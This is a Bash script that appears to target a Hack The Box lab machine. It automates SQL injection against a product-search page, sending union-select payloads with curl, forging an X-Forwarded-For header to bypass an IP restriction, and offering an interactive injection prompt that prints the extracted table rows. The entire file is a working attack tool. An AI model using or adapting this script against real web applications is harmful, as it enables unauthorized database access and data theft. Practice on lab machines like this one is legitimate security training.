function ctrl_c(){
    echo -e "\n\n${redColour}[+] Exiting the function...${endColour}\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# Global Variables

# Colors 
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function makeQuery(){
    myQuery="$1"
    echo; curl -s -X POST "http://10.10.10.167/search_products.php" -H \
    "X-Forwarded-For: 192.168.4.28" -d "productName=$myQuery" | awk '/<tbody>/,/<\/tbody>/' | \
    html2text | sed 's/1| //' | sed 's/| 3| 4| 5| 6//'

    #echo "The query is:: $myQuery"
}

function makeInteractive(){
    # usage: you will need to do <rlwrap ./sqli.sh -i> to go into interactive mode
    # Example command: ᐅ rlwrap sqli_htb_control.sh -i
    #                  [~]  Inject > ' union select 1,database(),3,4,5,6-- -
    while [ "$myCommand" != "exit" ]; do
        echo -ne "${redColour}[~]${endcolour} ${yellowColour} Inject >${endColour} "\
        && read -r myCommand
        echo; curl -s -X POST "http://10.10.10.167/search_products.php" -H \
        "X-Forwarded-For: 192.168.4.28" -d "productName=$myCommand" | awk '/<tbody>/,/<\/tbody>/' | \
        html2text | sed 's/1| //' | sed 's/| 3| 4| 5| 6//'
        echo $myCommand
        done
}

function helpPanel(){
    echo -e "\n${yellowColour}[+] Usage:${endColour}\n"
    echo -e "\t${purpleColour}q)${endColour}${yellowColour} \
    Query to try for example:${endColour}${purpleColour}\
    [${endColour}${turquoiseColour}-q \"' Union select 1,2,3,4,5,6-- -\"${endColour}${purpleColour}]${endColour}"
    echo -e "\t${purpleColour}i)${endColour}${yellowColour} \
    Enter interactive mode.${endColour}"
    echo -e "\t${purpleColour}h)${endColour}${yellowColour} \
    Show help panel.${endColour}"
    exit 1
}

declare -i parameter_counter=0; while getopts "q:ih" arg; do
    case $arg in
        q) myQuery=$OPTARG; let parameter_counter+=1;;
        i) let parameter_counter+=2;;
        h) helpPanel;;
    esac
done
# for example usage ./sqli -q "' union select 1,2,3,4,5,6-- -"
if [ $parameter_counter -eq 1 ]; then
    makeQuery "$myQuery"
elif [ $parameter_counter -eq 2 ]; then
    makeInteractive
else
    helpPanel
fi